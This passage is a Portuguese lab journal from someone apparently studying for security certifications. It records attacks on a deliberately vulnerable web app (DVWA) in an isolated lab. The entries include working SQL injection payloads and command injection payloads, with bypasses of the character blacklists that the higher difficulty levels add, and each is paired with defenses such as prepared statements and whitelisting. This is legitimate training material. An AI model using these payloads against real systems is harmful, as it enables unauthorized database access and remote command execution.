- Manter atualizações de segurança em dia (patch management)
- Reiniciar sistemas depois de atualizações de kernel, para eliminar a janela entre "patch instalado" e "patch ativo"

### Domínios relacionados

- **Security+ — D4 (Operações de Segurança):** gestão de patches, continuidade de serviço
- **A+ Core 2 — D1 (Sistemas Operativos) / D4 (Procedimentos Operacionais):** gestão de atualizações e Docker

### O que correu mal / faltou

Ver "Observações e interpretação" acima — a correção só ficou mesmo concluída na Entrada #14, não nesta sessão.

### Próximos passos

- [ ] Confirmar se compensa reiniciar a VM já, para aplicar o kernel novo, ou deixar para o fim da sessão

---

## Entrada #13 — SQL Injection nível Medium

**Data/hora:** 2026-08-05
**Máquinas ligadas:** OPNsense, Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar se as defesas introduzidas no nível Medium do DVWA (dropdown fixo + `mysqli_real_escape_string`) resistem ao mesmo tipo de ataque usado com sucesso no Low.

### Tipo de ataque / técnica

SQL Injection (in-band, sem aspas) — payload booleano tautológico, igual em espírito ao da Entrada #11, mas adaptado à ausência de aspas na query.

### Ação executada

1. **Baseline:** DVWA Security → Medium confirmado. Dropdown "User ID" com valores 1–5. Escolhido `1` → devolveu só o admin (1 utilizador), como esperado.
2. **Investigação de comportamento inesperado:** testes iniciais com payloads (`%' OR '1'='1` e `1 OR 1=1`) via campo de texto e URL devolveram resultados inconsistentes com o código-fonte lido (`medium.php`, `index.php`).
3. **Causa identificada:** duas cookies `security` em simultâneo, com paths diferentes (`/` = `medium`, `/vulnerabilities...` = `low`) — o browser enviava as duas, e o servidor lia a mais específica (`low`), fazendo a página do SQL Injection comportar-se como Low apesar do "DVWA Security" mostrar Medium.
4. **Correção:** cookie `security=low` (path `/vulnerabilities...`) apagada manualmente via Firefox DevTools → Storage → Cookies. Confirmado o dropdown a aparecer corretamente após hard refresh (`Ctrl+Shift+R`).
5. **Contorno da restrição do dropdown:** via DevTools (Inspecionar → *Edit As HTML* no `<select>`), adicionada opção:
   ```html
   <option value="1 OR 1=1" selected>teste</option>
   ```
6. Submetido — **sem aspas nenhumas no payload**, ao contrário do Low.

### Resultado

Devolvidos os **5 utilizadores** da tabela (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith) — defesa do Medium contornada com sucesso.

### Observações e interpretação

A query do Medium mudou de `WHERE user_id = '$id'` (Low) para `WHERE user_id = $id` (Medium) — **sem aspas**. O `mysqli_real_escape_string()` só sabe neutralizar aspas; sem aspas na query, não há nada para essa função proteger. Não foi preciso contornar a defesa — ela simplesmente não se aplicava a este caminho de ataque, porque não existe string nenhuma para "escapar". A vulnerabilidade real continua a ser a mesma da Entrada #11: falta de validação de tipo de dado (nunca se confirma que `$id` é mesmo um número inteiro).

**Consigo explicar isto a alguém?**
  Payload com aspas (Low): Não
  Payload sem aspas (Medium): Não

### Como nos podemos defender

- **Validação de input:** confirmar que `$id` é um número inteiro antes de o usar na query (ex. `is_numeric()` ou `(int)$id` em PHP) — resolveria tanto o Low como o Medium de uma vez
- **Prepared statements / parameterized queries:** continua a ser a defesa fundamental, independentemente de haver ou não aspas na query
- **Gestão de cookies com path consistente:** evitar duplicação acidental de cookies com o mesmo nome e paths diferentes — lição lateral desta sessão

### Domínios relacionados

- **CEH — D5 (Web Server e Web Application Hacking):** SQL Injection adaptada a uma defesa parcial
- **Security+ — D2 (Ameaças, Vulnerabilidades e Mitigações):** Injection continua a ser A03 do OWASP Top 10, mesmo com mitigação parcial
- **ISO/IEC 27001 — D6 (Controlos do Anexo A):** A.8.28 (codificação segura) — validação de tipo de dado em falta

### O que correu mal / faltou

- Investigação longa devido a duas causas sobrepostas: cookies `security` duplicadas com paths diferentes, e o aviso "Resend" do Firefox a reenviar dados da submissão anterior em vez dos atuais
- Lição lateral: edições de HTML via DevTools são temporárias — perdem-se em qualquer recarregamento de página

### Próximos passos

- [ ] SQL Injection nível High e Impossible — comparar defesas
- [ ] Testar `is_numeric()` como correção conceptual (só teoria, não vamos alterar o código do DVWA)


## Entrada #14 — Confirmação da correção do Docker + reconfirmação do SQL Injection Medium

**Data/hora:** 2026-08-06

**Máquinas ligadas:** OPNsense, Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Retomar o trabalho depois de religar as VMs, e descobrir que a correção do container `dvwa` planeada na Entrada #12 nunca tinha sido executada de facto.

### Ação executada

1. Kali voltou à rede de casa ao religar as VMs — corrigido com `dhclient`.
2. `docker ps -a` revelou o mesmo `CONTAINER ID` da Entrada #4 — prova de que a correção nunca foi executada.
3. Corrigido a sério: `docker stop` + `docker rm` + `docker run` com `--restart=unless-stopped`. Novo ID: `2a0f9de87992`.
4. Base de dados reinicializada via `setup.php`.
5. Payload `1 OR 1=1` reconfirmado via `curl` direto ao servidor, com cookies `security` e `PHPSESSID`.

### Resultado

Container `Up`, restart policy confirmada. `curl` devolveu os 5 utilizadores — vulnerabilidade da Entrada #13 reconfirmada, desta vez sem depender do browser.

**Screenshot guardado:**

![screenshots/2026-08-06/entrada13-sqli-medium-curl.png](screenshots/2026-08-06/entrada13-sqli-medium-curl.png)

### Como nos podemos defender

Mesmo da Entrada #13 — validação de tipo de dado, prepared statements. Extra: containers de produção devem nascer sempre com política de restart definida.

### Domínios relacionados

- **Security+ — D4:** continuidade de serviço, gestão de configuração
- **CEH — D5:** reconfirmação via ferramenta de linha de comandos

### O que correu mal / faltou

Correção da Entrada #12 tinha ficado só planeada, não executada — descoberto hoje pelo `CONTAINER ID` inalterado.

### Próximos passos

- [ ] SQL Injection nível High e Impossible

---

## Entrada #15 — SQL Injection nível High

**Data/hora:** 2026-08-11

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

**Snapshot antes de mexer:** `2026-08-11_lab-estavel-base` (Kali + Servidor Vulnerável), com descrição do estado. Primeiro snapshot de longo prazo do lab.

### Objetivo / Propósito

Explorar o SQL Injection no nível High do DVWA, perceber o que o distingue do Low (Entrada #11) e do Medium (Entrada #13), e consolidar a compreensão da defesa antes de avançar para o Impossible.

### Ação executada

1. **Preparação de rede:** o adaptador do Kali tinha voltado a reverter para a rede de casa (`192.168.1.50`). Corrigido confirmando "LAN Segment: Ciber" nas settings da VM, OPNsense ligada, e renovação DHCP:
   ```
   sudo dhclient -r eth0 && sudo dhclient eth0   # liberta e renova o IP
   ip a                                          # eth0 = 192.168.10.102
   ping -c 3 192.168.10.101                      # 0% packet loss → alvo alcançável
   ```
2. **Baseline:** DVWA Security → High confirmado. Módulo SQL Injection agora apresenta o link "Click here to change your ID", que abre uma **janela separada** ("SQL Injection Session Input") — o input já não está na mesma página do resultado.
3. **Caso de controlo:** submetido `1` na janela → devolveu só o admin (1 utilizador), como esperado.
4. **Payload:** submetido na mesma janela, **com aspas** (ao contrário do Medium):
   ```
   1' OR '1'='1' #
   ```
   - `1'` — fecha a aspa que o código PHP abriu (`WHERE user_id = '$id'`)
   - `OR '1'='1'` — condição tautológica, verdadeira para todas as linhas
   - `#` — comenta o resto da query (` LIMIT 1;`), anulando o travão que limitava a 1 resultado

### Resultado

Devolvidos os **5 utilizadores** da tabela (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith). Ataque bem-sucedido: uma caixa que devia devolver UM utilizador foi convencida a devolver a lista completa.

**Screenshot guardado:**

![screenshots/2026-08-11/entrada15-sqli-high-5-utilizadores.png](screenshots/2026-08-11/entrada15-sqli-high-5-utilizadores.png)

### Observações e interpretação

A grande diferença do High **não está na força da defesa do código** — essa continua fraca. O que muda é a *arquitetura*: o input está numa janela separada e é guardado na **sessão** (o output aparece noutra página), e a query introduz um `LIMIT 1` que força um único resultado. Comparado com os anteriores: no Low bastava fechar a aspa; no Medium a query perdeu as aspas e o `mysqli_real_escape_string()` tornou-se inútil; no High as aspas voltam, mas o novo obstáculo é o `LIMIT 1`, contornado com o comentário `#`.

O desacoplamento input/output via sessão dificulta sobretudo **ataques automáticos** (um script ingénuo espera ler o resultado no mesmo sítio onde submete). Para um humano que percebe o fluxo, continua trivialmente injetável — em boa parte porque o payload já vinha pronto; *descobrir* que era preciso comentar o `LIMIT 1` é que é a parte trabalhosa.

**Consigo explicar isto a alguém?**
  Lógica do ataque (porque é que devolve 5 em vez de 1) e defesa: **Sim** — por palavras minhas.
  Construir o payload do zero (chegar sozinho ao `#` para matar o `LIMIT 1`): **Ainda não** — objetivo de repetição, não falha de compreensão.

### Como nos podemos defender

- **Prepared statements / parameterized queries:** defesa principal e definitiva. A estrutura da query fica fixa à partida e o input viaja sempre como dado, nunca como código — o mesmo payload não devolve nada. É o que o nível Impossible implementa.
- **Validação de input:** confirmar que o ID é inteiro (`is_numeric()` / `(int)$id`) antes de o usar.
- **Menor privilégio** da conta de base de dados usada pela aplicação, para limitar o estrago de uma falha.
- **WAF** como camada de reforço — não substitui código correto.
- Nota sobre IA: a IA democratizou o ataque (baixou a barreira de quem o consegue tentar), mas não o fortaleceu — contra prepared statements, o melhor payload do mundo não vale nada. A mesma IA também reforça a defesa (revisão de código, análise de logs).

### Domínios relacionados

- **Security+ — D2 (Ameaças, Vulnerabilidades e Mitigações):** Injection (A03 do OWASP Top 10); D4 — codificação segura / validação de input
- **CEH — D5 (Web Server e Web Application Hacking):** SQL Injection com contorno de `LIMIT 1` e input baseado em sessão
- **ISO/IEC 27001 — D6 (Controlos do Anexo A):** A.8.28 (codificação segura), A.8.26 (requisitos de segurança de aplicações)
- **NIS2:** medidas de desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- **Rede:** adaptador do Kali revertido para a rede de casa (problema recorrente — ver Entrada #14). Resolvido com `dhclient` após confirmar o LAN Segment e a OPNsense ligada.
- **Confusão inicial com SSH ("No route to host" / "Destination Host Unreachable"):** clarificado que o Servidor Vulnerável tem duas interfaces — `ens33` (`192.168.10.101`, segmento Ciber, isolado do host físico por design) e `ens37` (`192.168.203.x`, NAT, usado para SSH de administração). O host não alcança a rede Ciber, e está correto assim.
- **Dificuldade conceptual:** "tenho dificuldade em perceber o que não vejo" (a query corre no servidor, invisível). O excesso de teoria à partida atrapalhou; o que funcionou foi fazer primeiro (ver 1 → 5 utilizadores no ecrã) e explicar depois, a partir do que estava visível.

### Próximos passos

- [x] SQL Injection nível Impossible — ver o mesmo payload FALHAR contra prepared statements — feito em 2026-08-12 (Entrada #16)
- [x] Estender o guia de estudo para incluir o High (novidade do `LIMIT 1` + `#`, janela/sessão) — feito em 2026-08-11

---

## Entrada #16 — SQL Injection nível Impossible

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

**Snapshot antes de mexer:** `2026-08-12_kali-atualizado` (Kali, após atualização de ~190 pacotes) + `2026-08-11_lab-estavel-base` (Servidor Vulnerável, ainda válido — não sofreu alterações). O exercício não muda nada estrutural, mas os snapshots ficam como ponto de retorno.

### Objetivo / Propósito

Fechar o ciclo do SQL Injection no DVWA: submeter no nível Impossible o mesmo payload que funcionou no High (Entrada #15) e observar que **falha**, percebendo porquê. Consolidar os prepared statements como a defesa definitiva.

### Ação executada

1. **Setup:** confirmada a ligação ao alvo (`ping 192.168.10.101` → 0% packet loss). DVWA Security → Impossible confirmado ("Security Level: impossible"). Módulo SQL Injection: a caixa de input volta a estar embutida na própria página (como no Low), já não numa janela separada como no High.
2. **Caso de controlo:** na caixa User ID, submetido `1` → devolveu `admin` (1 utilizador). Página funciona normalmente.
3. **Ataque:** submetido o mesmo payload do High:
   ```
   1' OR '1'='1' #
   ```

### Resultado

A área de resultados ficou **vazia** — nenhum utilizador devolvido. Ao contrário do High (Entrada #15), onde este payload devolveu os 5 utilizadores, aqui o ataque **falhou**: não houve penetração, foi ineficaz.

**Screenshot guardado:**

![screenshots/2026-08-12/entrada16-sqli-impossible-ataque-falhado.png](screenshots/2026-08-12/entrada16-sqli-impossible-ataque-falhado.png)

### Observações e interpretação

O código do Impossible usa **prepared statements** (queries parametrizadas). A estrutura da query é definida à partida e fica fixa; o input viaja sempre como **dado**, nunca como código. Por isso a base de dados foi procurar, literalmente, um utilizador cujo ID fosse a *string* `1' OR '1'='1' #` — como não existe, devolveu vazio. O input nunca "saiu da jaula" para virar comando, que era a raiz da vulnerabilidade nos três níveis anteriores. O Impossible acrescenta ainda validação de tipo (o ID tem de ser inteiro) e um token anti-CSRF (`user_token` no URL), mas a defesa que mata o SQL Injection é o prepared statement.

Lição que fecha o ciclo: **os níveis Low/Medium/High/Impossible não são configurações que ligam/desligam proteções — são versões diferentes do código-fonte.** Só o Impossible foi escrito com prepared statements; se o Low os usasse, o ataque teria falhado logo aí. No mundo real não há "níveis": uma aplicação ou tem o código escrito de forma segura (à Impossible) ou não. Os prepared statements não são um "modo", são uma **prática de programação** universal.

### Deduções e raciocínio (certos e corrigidos)

- **Dedução certa:** previ, antes de testar, que o ataque ia falhar porque o Impossible usa prepared statements — mesmo sem ter a certeza total. Confirmou-se.
- **Dedução corrigida:** perguntei se esta defesa "só funciona no modo Impossible". O pressuposto estava errado — pensava que os níveis eram configurações que ativam proteções. Percebi que são versões diferentes do código, e que os prepared statements funcionam em **qualquer** aplicação, não só no Impossible. Uma dedução parcialmente errada que virou compreensão — registada de propósito, porque o percurso do raciocínio também é aprendizagem.

**Consigo explicar isto a alguém?**
  Porque é que a caixa devolveu vazio (prepared statements, o input tratado como dado) e porque é que a defesa é universal e não um "modo": **Sim** — por palavras minhas.

### Como nos podemos defender

Esta entrada **é** a demonstração da defesa: prepared statements / parameterized queries, reforçados por validação de tipo de input e token anti-CSRF. É o contraste direto com as Entradas #11, #13 e #15 (Low, Medium, High), onde a ausência desta prática permitiu o ataque.

### Gravidade e impacto real (num cenário empresarial) — síntese para todo o módulo SQL Injection (Entradas #10-16)

A SQL Injection continua a ser uma das classes de vulnerabilidade mais danosas que existem, precisamente porque o alvo é quase sempre o ativo mais valioso de uma empresa: a sua base de dados. Um ataque bem-sucedido pode significar a exfiltração completa de dados de clientes (nomes, moradas, por vezes dados de pagamento), contorno de autenticação, e em casos mais avançados (consultas encadeadas, funções do próprio motor de base de dados) até execução de comandos no servidor. Numa pequena/média empresa, a base de dados comprometida é muitas vezes a única que existe — contém todos os registos de todos os clientes, e uma fuga bem-sucedida pode ser existencial, sobretudo pelos custos de notificação de violação de dados que uma empresa pequena dificilmente absorve. Numa empresa grande, as bases de dados costumam estar mais segmentadas e monitorizadas (WAF, deteção de queries anómalas), o que pode conter o ataque mais cedo — mas o volume de dados em risco é muito maior, e coimas regulatórias (RGPD) escalam com o número de registos expostos, pelo que a exposição financeira absoluta tende a ser maior mesmo quando a empresa sobrevive ao incidente.

### Domínios relacionados

- **Security+ — D2 / D4:** Injection (A03 do OWASP Top 10) e as práticas de codificação segura que a mitigam
- **CEH — D5 (Web Server e Web Application Hacking):** confirmação de que uma defesa correta anula a exploração
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura), A.8.25 (ciclo de desenvolvimento seguro)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada de relevante no exercício em si — correu limpo. Antes de começar, o Kali tinha ~190 atualizações pendentes (normal numa distribuição *rolling release*); instaladas e snapshot tirado antes do exercício.
- Nota de método: a rede do Kali, desta vez, já estava correta ao arrancar (não reverteu para a rede de casa) — a confirmar se se mantém nas próximas sessões.

### Próximos passos

- [ ] Fechado o capítulo do SQL Injection (Low → Medium → High → Impossible). Escolher o próximo módulo do DVWA (sugestões: SQL Injection Blind, ou Command Injection, mantendo o padrão Low → Impossible)
- [ ] Considerar consolidar num quadro-resumo a comparação dos quatro níveis (payload, defesa, resultado)

---

## Entrada #17 — Command Injection (nível Low)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Arrancar o próximo módulo do roteiro depois de fechar o SQL Injection: Command Injection, nível Low. Perceber como o input pode escapar não para uma query SQL, mas para a **shell do sistema operativo** do servidor.

### Ação executada

1. DVWA Security → Low. Módulo Command Injection (`/vulnerabilities/exec/`): formulário "Ping a device" que pede um endereço IP.
2. **Caso de controlo:** `127.0.0.1` → ping normal (4 respostas). A página funciona como esperado.
3. **Injeção:** encadeando comandos com `;`:
   ```
   127.0.0.1; whoami            → ping + www-data
   127.0.0.1; whoami; hostname  → ping + www-data + 2a0f9de87992
   127.0.0.1; ls -la            → ping + listagem (help, index.php, source), tudo www-data
   ```

### Resultado

Cada comando encadeado com `;` foi executado no sistema operativo do servidor, a seguir ao ping. Descobertas por uma caixa que só pedia um IP:
- **`www-data`** — o utilizador com que o servidor web corre (conta de baixo privilégio).
- **`2a0f9de87992`** — o hostname, que é uma string hexadecimal aleatória: assinatura de um **container Docker**. Bate certo com o ID do container do DVWA registado na Entrada #14 — ou seja, confirmei, do lado do atacante, que o alvo corre dentro de Docker.
- **Listagem de ficheiros** da aplicação (`index.php`, `help`, `source`), acessível via `ls -la`.

**Screenshots guardados:**

![screenshots/2026-08-12/entrada17-cmdinjection-controlo-ping.png](screenshots/2026-08-12/entrada17-cmdinjection-controlo-ping.png)

![screenshots/2026-08-12/entrada17-cmdinjection-whoami.png](screenshots/2026-08-12/entrada17-cmdinjection-whoami.png)

![screenshots/2026-08-12/entrada17-cmdinjection-ls.png](screenshots/2026-08-12/entrada17-cmdinjection-ls.png)

### Observações e interpretação

A página constrói um comando de sistema do tipo `ping -c 4 <input>` e executa-o na shell. Sem filtragem, o `;` (e outros como `&&` ou `|`) permite **encadear** um comando próprio a seguir ao ping. A raiz é a mesma do SQL Injection — input tratado como código, não como dado — mas o alvo é diferente: em vez da base de dados, é a **shell do sistema operativo**. Por isso é mais perigoso: não se roubam apenas dados, obtém-se **execução de comandos no servidor** (RCE — *Remote Code Execution*, como sugere o primeiro link "More Information" da própria página).

### Deduções e raciocínio (certos e corrigidos)

- **Intuição inicial (certa):** ao ver a caixa que pedia um IP para "ping", deduzi que era um sítio onde se podia injetar um comando. Apontava para o mecanismo certo.
- **Previsão certa:** previ que, ao injetar, ia ver o resultado do comando por baixo do ping. Confirmou-se (`www-data`).
- **Confusão que virou compreensão:** fiquei baralhado porque no output não aparecia a palavra "whoami" — cheguei a dizer "não existe whoami". Percebi depois que um comando **não mostra o próprio nome, só o resultado**: `www-data` *é* a resposta do `whoami` (à pergunta "quem sou eu?"). Foi o meu principal salto de compreensão nesta sessão.
- **Ligação feita:** identifiquei `www-data` como utilizador e `2a0f9de87992` como hostname — e reconheci este último como o ID do container Docker da minha Entrada #14.

**Consigo explicar isto a alguém?**
  Porque é que o servidor executou o `whoami`/`hostname`/`ls` quando a caixa só pedia um IP (o `;` encadeia comandos na shell e o input não é validado), e que a saída de um comando é o seu *resultado*, não o seu nome: **Sim** — por palavras minhas.

### Como nos podemos defender

- **Validação de input:** aceitar apenas o formato esperado (um IP válido) e rejeitar caracteres de shell (`;`, `&&`, `|`, `` ` ``, `$()`).
- **Nunca passar input do utilizador diretamente à shell:** usar funções/APIs que não invoquem uma shell, ou bibliotecas próprias para a tarefa (ex.: fazer o ping por código, não por comando de sistema).
- **Em PHP:** `escapeshellarg()` / `escapeshellcmd()` como reforço (defesa parcial); o nível Impossible deste módulo usa validação estrita do formato do IP.
- **Menor privilégio:** o servidor correr como `www-data` (e não root) limita o estrago de uma exploração — como se confirmou.

### Domínios relacionados

- **Security+ — D2 (Ameaças/Vulnerabilidades):** Command Injection; D4 — codificação segura e validação de input
- **CEH — D5 (Web Application Hacking):** RCE via command injection; reconhecimento (descoberta de que o alvo é um container)
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Momento de confusão com o output do `whoami` (não ver o nome do comando na resposta) — esclarecido, e registado de propósito como aprendizagem.
- Por fazer: os níveis **Medium** e **High** deste módulo, para ver como o payload se adapta quando começam a filtrar caracteres.

### Próximos passos

- [x] Command Injection nível Medium — filtragem observada e contornada (Entrada #18, 2026-08-12)
- [ ] Command Injection nível High — próximo
- [ ] Comparar com o código do nível Impossible do módulo, para ver a defesa correta (validação estrita do IP)

---

## Entrada #18 — Command Injection (nível Medium)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Repetir o ataque de Command Injection no nível Medium para ver que defesa é introduzida e por onde ainda se pode passar — tal como se fez no SQL Injection Medium.

### Ação executada

1. DVWA Security → Medium. Módulo Command Injection.
2. **Repetir o payload do Low:** `127.0.0.1; whoami` → devolveu **só o ping**, sem `www-data`. O ataque do Low deixou de funcionar.
3. **Testar operadores alternativos**, um a um:
   ```
   127.0.0.1 | whoami    → www-data          (PASSA — pipe)
   127.0.0.1 && whoami   → só o ping          (BLOQUEADO)
   127.0.0.1 & whoami    → ping + www-data    (PASSA — segundo plano)
   ```

### Resultado

O Medium tem um filtro que **apaga** certos caracteres do input: o `;` e o `&&` (por isso o payload do Low e o `&&` falharam). Mas o filtro **esqueceu** o `|` e o `&` sozinho — ambos permitiram executar o `whoami` e obter `www-data`. Defesa contornada por dois caminhos diferentes.

**Screenshots guardados:**

![screenshots/2026-08-12/entrada18-cmdinjection-medium-semicolon-filtrado.png](screenshots/2026-08-12/entrada18-cmdinjection-medium-semicolon-filtrado.png)

![screenshots/2026-08-12/entrada18-cmdinjection-medium-pipe-bypass.png](screenshots/2026-08-12/entrada18-cmdinjection-medium-pipe-bypass.png)

![screenshots/2026-08-12/entrada18-cmdinjection-medium-doubleamp-bloqueado.png](screenshots/2026-08-12/entrada18-cmdinjection-medium-doubleamp-bloqueado.png)

![screenshots/2026-08-12/entrada18-cmdinjection-medium-amp-bypass.png](screenshots/2026-08-12/entrada18-cmdinjection-medium-amp-bypass.png)

### Observações e interpretação

A defesa do Medium é uma **blacklist**: uma lista de caracteres proibidos que o código apaga do input (aqui, `;` e `&&`). A blacklist tem uma fraqueza estrutural — é quase impossível listar *tudo* o que é perigoso. Basta esquecer um caractere e a porta fica aberta, como aconteceu com o `|` e o `&`. A alternativa robusta é uma **whitelist**: em vez de "proíbe estes", diz "só permite exatamente isto" (ex.: só dígitos e pontos de um IP válido) — e aí não há como escapar.

Cada operador de shell tem a sua mecânica, o que também explica diferenças no output:
- `;` — executa em **sequência** (comando 1, depois comando 2); ambos escrevem no ecrã.
- `|` (pipe) — canaliza a **saída** do primeiro como **entrada** do segundo; por isso, com `| whoami`, o output do ping é "engolido" pelo `whoami` (que o ignora) e só se vê o `www-data`.
- `&` — põe o primeiro comando em **segundo plano** e corre o segundo em simultâneo; por isso se vê o ping **e** o `www-data`.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão inicial errada:** previ que "não ia mudar nada de significativo, por analogia com o SQL Injection Medium". Ao testar o payload do Low e não ver o `www-data`, **corrigi**: afinal há filtragem, o `;` é apagado. Boa lição sobre não assumir que a analogia se aplica sempre.
- **Dedução certa:** propus o `|` como caractere alternativo e previ que, se passasse, o `www-data` teria de aparecer. Confirmou-se.
- **Pergunta que gerou aprendizagem:** ao ver que o `|` só devolvia o `www-data` (sem o ping), perguntei porque é que "o resto desaparecia". Percebi a mecânica do pipe — o output do ping foi canalizado para o `whoami`, não desapareceu.
- **Confirmação da fragilidade da blacklist:** testei `&&` (bloqueado) vs `&` (passa) e vi ao vivo que bloquearam um "irmão" mas esqueceram o outro.

**Consigo explicar isto a alguém?**
  A diferença entre blacklist e whitelist, porque é que a blacklist do Medium é frágil, e a mecânica dos operadores `;`/`|`/`&`: **Sim** — por palavras minhas.

### Como nos podemos defender

- **Whitelist em vez de blacklist:** validar que o input tem *exatamente* o formato de um IP (só dígitos e pontos, quatro octetos) e rejeitar tudo o resto. É a defesa correta, e é o que o nível Impossible do módulo faz.
- **Não passar input do utilizador à shell:** usar código/bibliotecas próprias em vez de construir um comando de sistema.
- **Menor privilégio:** o servidor correr como `www-data` limita o estrago.

### Domínios relacionados

- **Security+ — D2 / D4:** Command Injection; validação de input (whitelist vs blacklist) como controlo de codificação segura
- **CEH — D5 (Web Application Hacking):** evasão de filtros / bypass de blacklist
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada falhou no exercício — correu limpo e didático. A previsão inicial errada ("não muda nada") foi útil: mostrou, na prática, que cada vulnerabilidade se defende à sua maneira.
- Por fazer: o nível **High** deste módulo, e comparar com o **Impossible** (a whitelist na prática).

### Próximos passos

- [x] Command Injection nível High — filtragem maior contornada com `&` e `|` sem espaço (Entrada #19, 2026-08-12)
- [ ] Comparar com o nível Impossible do módulo (validação estrita do IP = whitelist)

---

## Entrada #19 — Command Injection (nível High)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Fechar o módulo Command Injection no nível High: ver que filtragem mais apertada é introduzida e se ainda há forma de a contornar.

### Ação executada

1. Confirmada a ligação ao alvo (`ping 192.168.10.101` → 0% packet loss) e DVWA Security → High.
2. **Testar os bypasses do Medium:**
   ```
   127.0.0.1 | whoami    → só o ping           (BLOQUEADO — o `| ` com espaço foi filtrado)
   127.0.0.1 & whoami    → ping + www-data      (AINDA PASSA — o `&` não foi bloqueado)
   ```
3. **Caçar a brecha do pipe:** como o filtro apaga `| ` (pipe *com espaço*), testar sem espaço:
   ```
   127.0.0.1|whoami      → www-data             (PASSA — sem o espaço, a sequência filtrada não existe)
   ```

### Resultado

O High tem uma blacklist maior que o Medium — passou a apanhar o `| ` (pipe com espaço), que era bypass no Medium. Mas continua a ser blacklist e continua furada: o `&` sozinho ainda funciona, e o `|` **sem espaço** também. Módulo Command Injection explorado do Low ao High, sempre com a mesma fraqueza de fundo.

**Screenshots guardados:**

![screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-espaco-bloqueado.png](screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-espaco-bloqueado.png)

![screenshots/2026-08-12/entrada19-cmdinjection-high-amp-bypass.png](screenshots/2026-08-12/entrada19-cmdinjection-high-amp-bypass.png)

![screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-semespaco-bypass.png](screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-semespaco-bypass.png)

### Observações e interpretação

A defesa do High procura sequências de caracteres específicas para apagar — nomeadamente `| ` (pipe **seguido de espaço**). O detalhe é revelador: ao tirar o espaço (`|whoami`), a sequência que o filtro procura deixa de existir e o pipe passa. **Um único espaço** é a diferença entre a defesa funcionar e falhar. É a demonstração máxima da fragilidade da blacklist — não basta pensar nos caracteres perigosos, é preciso antecipar todas as *variações* de como os escrever, o que é humanamente impossível. Por isso a defesa correta é a **whitelist** (só aceitar o formato de um IP válido).

Os diferentes operadores de shell (`;`, `&&`, `||`, `&`, `|`, `` ` ``/`$()`) têm comportamentos distintos, o que explica também as diferenças no output observadas ao longo do módulo. A tabela de referência e a consolidação completa do módulo estão em [`guias-estudo/guia-estudo-command-injection.md`](guias-estudo/guia-estudo-command-injection.md) (para não duplicar aqui).

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** antes de testar, previ que o High seria "mais restrito, mas que haveria sempre uma brecha (qual, não sabia)". Confirmou-se em cheio — tapou o `| ` mas deixou o `&` e o `|` sem espaço.
- **Erro de leitura, corrigido:** ao testar `& whoami`, li mal o ecrã e pensei que tinha sido bloqueado. Ao reconfirmar, vi que o `www-data` apareceu — corrigi a observação antes de tirar qualquer conclusão. (Lição de método: confirmar bem o que se vê antes de concluir.)
- **Síntese própria:** pesquisei os operadores de shell e percebi que cada um tem um comportamento diferente — sem decorar, sabendo que se consulta. Conclusão registada no guia de estudo.

**Consigo explicar isto a alguém?**
  Porque é que o High é mais restrito mas ainda se contorna, e porque é que um simples espaço engana o filtro: **Sim** — por palavras minhas.

### Como nos podemos defender

- **Whitelist** em vez de blacklist: aceitar apenas o formato de um IP válido (dígitos e pontos) e recusar tudo o resto. É a única defesa que não depende de "lembrar todos os caracteres perigosos".
- Não passar input do utilizador à shell; menor privilégio (`www-data`).
- É o que o nível **Impossible** do módulo implementa — a comparar numa próxima sessão.

### Domínios relacionados

- **Security+ — D2 / D4:** Command Injection; validação de input (whitelist vs blacklist)
- **CEH — D5 (Web Application Hacking):** evasão de filtros / bypass de blacklist por variação de sintaxe
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Um erro de leitura do ecrã (pensar que o `&` tinha sido bloqueado), corrigido ao reconfirmar — registado de propósito como aprendizagem de método.
- Por fazer: o nível **Impossible** do módulo (a whitelist na prática), para fechar a comparação como no SQL Injection.

### Próximos passos

- [x] Command Injection nível Impossible — ver a whitelist a recusar todos os bypasses (Entrada #20, 2026-08-12)
- [ ] Avançar para o próximo módulo do roteiro (XSS)

---

## Entrada #20 — Command Injection (nível Impossible)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

